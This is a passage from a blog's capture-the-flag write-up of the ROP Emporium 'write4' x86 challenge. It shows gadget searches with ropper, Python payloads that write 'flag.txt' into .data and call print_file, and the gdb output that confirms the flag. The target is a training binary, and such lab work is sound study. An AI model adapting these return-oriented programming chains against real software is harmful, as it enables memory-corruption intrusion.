+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>24<span style="color:#f92672">]</span> .data             PROGBITS        0804a018 <span style="color:#ae81ff">001018</span> <span style="color:#ae81ff">000008</span> <span style="color:#ae81ff">00</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>25<span style="color:#f92672">]</span> .bss              NOBITS          0804a020 <span style="color:#ae81ff">001020</span> <span style="color:#ae81ff">000004</span> <span style="color:#ae81ff">00</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">1</span>  
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Key to Flags:  
+</span></span><span style="display:flex;"><span> W <span style="color:#f92672">(</span>write<span style="color:#f92672">)</span>, A <span style="color:#f92672">(</span>alloc<span style="color:#f92672">)</span>, X <span style="color:#f92672">(</span>execute<span style="color:#f92672">)</span>, M <span style="color:#f92672">(</span>merge<span style="color:#f92672">)</span>, S <span style="color:#f92672">(</span>strings<span style="color:#f92672">)</span>, I <span style="color:#f92672">(</span>info<span style="color:#f92672">)</span>,  
+</span></span><span style="display:flex;"><span> L <span style="color:#f92672">(</span>link order<span style="color:#f92672">)</span>, O <span style="color:#f92672">(</span>extra OS processing required<span style="color:#f92672">)</span>, G <span style="color:#f92672">(</span>group<span style="color:#f92672">)</span>, T <span style="color:#f92672">(</span>TLS<span style="color:#f92672">)</span>,  
+</span></span><span style="display:flex;"><span> C <span style="color:#f92672">(</span>compressed<span style="color:#f92672">)</span>, x <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>, o <span style="color:#f92672">(</span>OS specific<span style="color:#f92672">)</span>, E <span style="color:#f92672">(</span>exclude<span style="color:#f92672">)</span>,  
+</span></span><span style="display:flex;"><span> D <span style="color:#f92672">(</span>mbind<span style="color:#f92672">)</span>, p <span style="color:#f92672">(</span>processor specific<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>The .data section appears to be writeable. Readelf can also be used to read that section.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt;readelf write432 -x .data
+</span></span><span style="display:flex;"><span>Hex dump of section <span style="color:#e6db74">&#39;.data&#39;</span>:  
+</span></span><span style="display:flex;"><span> 0x0804a018 <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>                   ........
+</span></span></code></pre></div><p>It looks empty. This section is likely safe to overwrite. The address of that section is <code>0x0804a018</code>. Now I need a way to write that value to the edi register. I also need the ability to write arbitrary bytes to the ebp register. I use <a href="https://github.com/sashs/Ropper">ropper</a> to look for more useful gadgets. I believe pop will be the most useful command. It should allow me to place values from the stack(which I control) into the needed registers.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt;ropper -f write432
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0x08048525: pop ebp; lea esp, <span style="color:#f92672">[</span>ecx - 4<span style="color:#f92672">]</span>; ret;    
+</span></span><span style="display:flex;"><span>0x080485ab: pop ebp; ret;    
+</span></span><span style="display:flex;"><span>0x080485a8: pop ebx; pop esi; pop edi; pop ebp; ret;  
+</span></span><span style="display:flex;"><span>0x0804839d: pop ebx; ret;    
+</span></span><span style="display:flex;"><span>0x08048524: pop ecx; pop ebp; lea esp, <span style="color:#f92672">[</span>ecx - 4<span style="color:#f92672">]</span>; ret; 
+</span></span><span style="display:flex;"><span>0x080485aa: pop edi; pop ebp; ret;    
+</span></span><span style="display:flex;"><span>0x080485a9: pop esi; pop edi; pop ebp; ret;
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>The most useful gadget appears to be this one: <code>0x080485aa: pop edi; pop ebp; ret;</code>. I will now perform a short test run to see if I can get values into the registers.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080485aa</span>) <span style="color:#75715e"># pop edi; pop ebp; ret;</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;BBBB&#39;</span> <span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;DDDD&#39;</span>
+</span></span><span style="display:flex;"><span>out<span style="color:#f92672">=</span> bytes(buf)
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(out)
+</span></span></code></pre></div><p>I use GDB to examine the registers after overflowing the buffer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info registers    
+</span></span><span style="display:flex;"><span>eax            0xb                 <span style="color:#ae81ff">11</span>  
+</span></span><span style="display:flex;"><span>ecx            0xf7f770f4          -134778636  
+</span></span><span style="display:flex;"><span>edx            0x1                 <span style="color:#ae81ff">1</span>  
+</span></span><span style="display:flex;"><span>ebx            0x41414141          <span style="color:#ae81ff">1094795585</span>  
+</span></span><span style="display:flex;"><span>esp            0xffffd49c          0xffffd49c  
+</span></span><span style="display:flex;"><span>ebp            0x44444444          0x44444444  
+</span></span><span style="display:flex;"><span>esi            0xffffd564          -10908  
+</span></span><span style="display:flex;"><span>edi            0x42424242          <span style="color:#ae81ff">1111638594</span>
+</span></span></code></pre></div><p>The B&rsquo;s wound up in the edi register while the D&rsquo;s ended up in the ebp register. Now I put the actual values I want in the two registers and attempt to use the ROP gadget to move the contents of ebp to the memory address in edi.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#buf=b&#39;\x43&#39;*4 </span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080485aa</span>) <span style="color:#75715e"># pop edi; pop ebp; ret;</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x0804a018</span>) <span style="color:#75715e"># .data address </span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag&#39;</span> <span style="color:#75715e"># half of argument to write</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x08048543</span>) <span style="color:#75715e">#mov    DWORD PTR [edi],ebp</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>out<span style="color:#f92672">=</span> bytes(buf)
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(out)
+</span></span></code></pre></div><p>I check the memory location.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/3x 0x804a018  
+</span></span><span style="display:flex;"><span>0x804a018:      0x67616c66      0x00000000      0x00000000
+</span></span></code></pre></div><p>It appears the value has been written to memory. I have to write the second half of the argument to memory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#writing first half of argument to memory</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080485aa</span>) <span style="color:#75715e"># pop edi; pop ebp; ret;</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x0804a018</span>) <span style="color:#75715e"># .data address</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag&#39;</span> <span style="color:#75715e"># half of argument to write</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x08048543</span>) <span style="color:#75715e">#mov    DWORD PTR [edi],ebp</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#writing second half of argument to memory</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080485aa</span>) <span style="color:#75715e"># pop edi; pop ebp; ret;</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x0804a018</span><span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>) <span style="color:#75715e"># .data address</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;.txt&#39;</span> <span style="color:#75715e"># half of argument to write</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x08048543</span>) <span style="color:#75715e">#mov    DWORD PTR [edi],ebp</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>out<span style="color:#f92672">=</span> bytes(buf)
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(out)
+</span></span></code></pre></div><p>It appears to work.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/3x 0x804a018    
+</span></span><span style="display:flex;"><span>0x804a018:      0x67616c66      0x7478742e      0x00000000
+</span></span></code></pre></div><p>It is now time to make the call to the <code>print_file@plt</code> function with the memory location where I wrote flag.txt as an argument.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#writing first half of argument to memory</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080485aa</span>) <span style="color:#75715e"># pop edi; pop ebp; ret;</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x0804a018</span>) <span style="color:#75715e"># .data address</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag&#39;</span> <span style="color:#75715e"># half of argument to write</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x08048543</span>) <span style="color:#75715e">#mov    DWORD PTR [edi],ebp</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#writing second half of argument to memory</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080485aa</span>) <span style="color:#75715e"># pop edi; pop ebp; ret;</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x0804a018</span><span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>) <span style="color:#75715e"># .data address</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;.txt&#39;</span> <span style="color:#75715e"># half of argument to write</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x08048543</span>) <span style="color:#75715e">#mov    DWORD PTR [edi],ebp</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># function call</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x80483d0</span>) <span style="color:#75715e"># &lt;print_file@plt&gt;</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;CCCC&#39;</span> <span style="color:#75715e"># fake return address</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x0804a018</span>) <span style="color:#75715e"># .data address / args 1</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>out<span style="color:#f92672">=</span> bytes(buf)
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(out)
+</span></span></code></pre></div><p>I run the program and get the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> run &lt; writebin    
+</span></span><span style="display:flex;"><span>The program being debugged has been started already.  
+</span></span><span style="display:flex;"><span>Start it from the beginning? <span style="color:#f92672">(</span>y or n<span style="color:#f92672">)</span> y  
+</span></span><span style="display:flex;"><span>Starting program: /home/spook2/school/notSchool/blog fodder/rop/write4/write432 &lt; writebin  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Thread debugging using libthread_db enabled<span style="color:#f92672">]</span>  
+</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/usr/lib/libthread_db.so.1&#34;</span>.  
+</span></span><span style="display:flex;"><span>write4 by ROP Emporium  
+</span></span><span style="display:flex;"><span>x86  
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>Go ahead and give me the input already!  
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>&gt; Thank you!  
+</span></span><span style="display:flex;"><span>ROPE<span style="color:#f92672">{</span>a_placeholder_32byte_flag!<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>This concludes the first batch of ROP exploit challenge write-ups for this blog. Completing these challenges was a fun way to brush up on my knowledge of assembly. I highly recommend <a href="https://ropemporium.com/">ROP Emporium</a>.</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        2211 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2022-05-24 20:00
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
+        
+        <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+        </div>
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="http://localhost:1313/posts/links-1/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">random links 1</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="http://localhost:1313/posts/first/">
+                    <span class="button__text">Dawn writeup but with slightly more programming</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.85fad2de4f13fec3bcb3b3cb10430cdb44a7b4a9749b32938241a5c6e77718df7624f1002b880521fdc26e24ec1077fda214bf1cb36ee3045510760d09638cae.js" integrity="sha512-hfrS3k8T/sO8s7PLEEMM20SntKl0mzKTgkGlxud3GN92JPEAK4gFIf3CbiTsEHf9ohS/HLNu4wRVEHYNCWOMrg=="></script>
+
+
+
+
+    </body>
+</html>
